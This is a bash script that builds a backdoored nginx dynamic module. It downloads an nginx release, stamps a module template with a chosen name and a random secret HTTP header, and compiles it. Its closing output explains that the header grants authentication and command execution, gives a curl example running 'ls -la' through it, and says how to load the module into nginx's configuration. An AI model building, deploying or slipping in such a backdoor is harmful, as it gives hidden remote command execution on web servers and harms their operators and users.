#!/bin/bash

function usage() {
    printf "%s\n"                                       \
        "usage: $(basename $0) [-l] [-r -n]"            \
        ""                                              \
        "-l     list nginx releases"                    \
        "-r     set nginx release"                      \
        "-n     set name for the built nginx module"    \
        "-h     print this help message and exit"
        
    exit 1
}

while getopts "lr:n:h" opts; do
    case $opts in
        l)
            releases=$(curl -sSL https://nginx.org/download/ | grep -Eoi '"nginx-[0-9\.]+.tar.gz"' | tr -d '"' | sort -u)
            printf "%s\n" "[inf] releases provided by nginx.org"
            for i in $releases; do
                printf "%s\n" "${i}"
            done
            exit 1
            ;;
        r) release="${OPTARG}";;
        n) name="${OPTARG}";;
        h) usage;;
        *) usage;;
    esac
done

header="X-$(tr -dc 'a-f0-9' < /dev/urandom | head -c32)"

if test -n "${name}"; then
    sed -i "s/__MODULENAME__/${name}/g" /root/ngx_mod_template/config
    sed -i "s/__NAME__/${name}/g" /root/ngx_mod_template/ngx_mod_template.c
    sed -i "s/__HEADER__/${header}/g" /root/ngx_mod_template/ngx_mod_template.c

    cp /root/ngx_mod_template/ngx_mod_template.c "/root/ngx_mod_template/${name}.c"
else
    usage
fi

if test -n "${release}"; then
    download_url="https://nginx.org/download/${release}"
    version=$(printf "%s\n" "${release}" | grep -Eo "([0-9]+\.[0-9]+\.[0-9]+)")
    logfile="/root/nginx-backdoor-mod/build_${version}.log"
    dir_name="/root/nginx-backdoor-mod"

    if [[ $(curl -o /dev/null -s -w "%{http_code}" "${download_url}") != "404" ]]; then
        printf "%s\n" "[inf] downloading ${download_url}"
        mkdir -p "${dir_name}" &>/dev/null
        (
            cd "${dir_name}"
            curl -sSL "${download_url}" -OJ
            printf "%s\n" "[inf] extracting ${release} to ${dir_name}"
            tar xf "${release}"
        )
    fi

    (
        cd "${dir_name}/nginx-${version}"

        if test -f configure; then
            if ./configure --add-dynamic-module=/root/ngx_mod_template/ --with-compat 2>&1 >$logfile; then
                printf "%s\n" "[inf] configure successful"
            else
                printf "%s\n" "[wrn] skipping \"--with-compat\" for configure"
                if ./configure --add-dynamic-module=/root/ngx_mod_template/ 2>&1 >$logfile; then
                    printf "%s\n" "[inf] configure successful"
                fi
            fi
        else
            printf "%s\n" "[err] \"configure\" not found"
            exit 1
        fi

        if make modules CFLAGS="-Wno-unused-result" 2>&1 >$logfile; then
            printf "%s\n" "[inf] successfully built ${name}.so"
        else
            if make CFLAGS="-Wno-unused-result" 2>&1 >$logfile; then
                printf "%s\n" "[inf] successfully built ${name}.so"
            fi
            printf "%s\n" "[err] failed to build ${name}.so"
        fi
    )

    if test -f "${dir_name}/nginx-${version}/objs/${name}.so"; then
        cp "${dir_name}/nginx-${version}/objs/${name}.so" "${dir_name}/${name}_v${version}_${header}.so"
        printf "%s\n"                                                                                                       \
            ""                                                                                                              \
            "[inf] output module \"${dir_name}/${name}_v${version}_${header}.so\""                                          \
            "[inf] use \"${header}\" for backdoor authentication + command execution"                                       \
            "[inf] example: curl http://localhost -H '${header}: ls -la'"                                                   \
            "[inf] enable with nginx module config in /etc/nginx/modules-enabled and \"load_module /path/to/${name}.so;\""  \
            "[inf] enable with the main nginx config in /etc/nginx/nginx.conf and \"load_module /path/to/${name}.so;\""
    else
        printf "%s\n" "[err] module not found at \"${dir_name}/nginx-*/objs/${name}.so\", this should not happen"
    fi
else
    usage
fi
